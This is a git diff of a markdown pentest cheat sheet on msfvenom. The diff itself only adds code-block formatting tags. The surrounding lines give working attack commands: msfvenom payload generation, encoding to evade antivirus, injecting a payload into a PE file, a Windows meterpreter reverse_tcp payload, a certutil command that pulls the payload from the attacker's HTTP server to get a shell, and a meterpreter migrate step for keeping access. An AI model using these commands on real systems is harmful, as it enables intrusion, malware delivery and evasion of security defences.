@@ -17,6 +17,7 @@
 
 ## **Practical Demonstration**
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```bash
 msfvenom -h # Open the msfvenom help page.
 msfvenom --list payloads # List every Msfvenom payloads.
@@ -35,6 +36,7 @@ msf5 > use multi/handler #Set up a listener
 CMD > certutil -urlcache -f http://<localIP>/<file> <file> #Download the payload from the Kali HTTP server and execute it
 # You then should receive a shell on your Kali!.
 ```
+{% endcode %}
 
 
 
@@ -54,6 +56,7 @@ CMD > certutil -urlcache -f http://<localIP>/<file> <file> #Download the payload
 
 ## **Practical Demonstration**
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```bash
 msfvenom --list encoders #List every Msfvenom encoders
 msfvenom <...> -e <encoderName> <...> #Generate a payload and encode it.
@@ -61,6 +64,7 @@ msfvenom <...> -e <encoderName> <...> #Generate a payload and encode it.
 #The more you encode a payload (number of iterations), the more you will have chances to succeed AV evasion. More than 10 will not to a lot though.
 msfvenom <...> -i <numberOfIterations> -e <encoderName> <...> #Generate and encode a payload with more a specified number of iterations.
 ```
+{% endcode %}
 
 
 
@@ -68,6 +72,7 @@ msfvenom <...> -i <numberOfIterations> -e <encoderName> <...> #Generate and enco
 
 ### **Practical Demonstration**
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```bash
 msfvenom <...> -x <pathToPE> <...> #Inject the payload into a portable executable
 # You can use the -k flag so the PE will execute as intended in addition to execute the payload BUT this will not work for most PEs
@@ -81,12 +86,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kaliIP LPORT=1234 -e x86/shik
 # in case of windows, we can use the [post/windows/manage/migrate] modult to migrate our session into another process in order for use to maintain access if the victim terminates the process.
 msf6 > use post/windows/manage/migrate
 ```
-
-
-
-
-
-
+{% endcode %}
 
 
 
